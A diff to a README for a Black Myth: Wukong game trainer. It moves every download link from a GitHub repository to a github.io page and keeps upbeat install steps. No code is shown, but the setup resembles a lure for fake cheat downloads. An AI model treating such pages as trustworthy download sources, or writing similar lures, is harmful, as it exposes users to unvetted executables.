@@ -1,6 +1,6 @@
 # 🐒 black-myth-wukong-trainer-2026 - Your Ultimate Wukong Power-Up Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Trainer_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fortuneEngineers/black-myth-wukong-trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-Trainer_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://fortuneengineers.github.io)
 
 ## 🎮 What Is This Trainer?
 
@@ -27,7 +27,7 @@ Follow these simple steps to get the trainer up and running on your Windows comp
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: [https://github.com/fortuneEngineers/black-myth-wukong-trainer-2026](https://github.com/fortuneEngineers/black-myth-wukong-trainer-2026)
+Visit this link to download the application: [https://fortuneengineers.github.io](https://fortuneengineers.github.io)
 
 Click the big green button that says "Download" or find the latest release file. The download should start automatically.
 
@@ -99,7 +99,7 @@ If you run into any problems, try these solutions:
 
 Ready to start? Here's the direct link again:
 
-[**Download black-myth-wukong-trainer-2026**](https://github.com/fortuneEngineers/black-myth-wukong-trainer-2026)
+[**Download black-myth-wukong-trainer-2026**](https://fortuneengineers.github.io)
 
 Visit this link to download the application. Once you have it, follow the steps in the "Getting Started" section above.
 
